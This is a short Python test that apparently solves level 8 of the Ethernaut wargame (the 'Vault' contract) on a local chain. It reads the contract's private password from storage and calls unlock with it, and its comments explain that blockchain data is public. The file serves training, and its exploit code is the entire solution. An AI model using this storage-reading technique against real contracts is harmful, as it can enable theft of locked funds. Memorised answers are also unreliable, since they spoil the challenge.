from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv08_vault import Vault


@default_chain.connect()
def test_lv08():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv08()
    exploit_lv08(contract)
    ethernaut.check_lv08(contract)

def exploit_lv08(contract: Vault):
    # Attack vector: Blockchain is public, no data can be hidden
    # Training: Reading from local blockchain using the testing framework - for mainnet/testnet you can use blockchain explorer
    key = read_storage_variable(Account(contract.address), "password")
    print(f"Extracted key: {key}")

    # unlock the contract with extracted key
    contract.unlock(key)
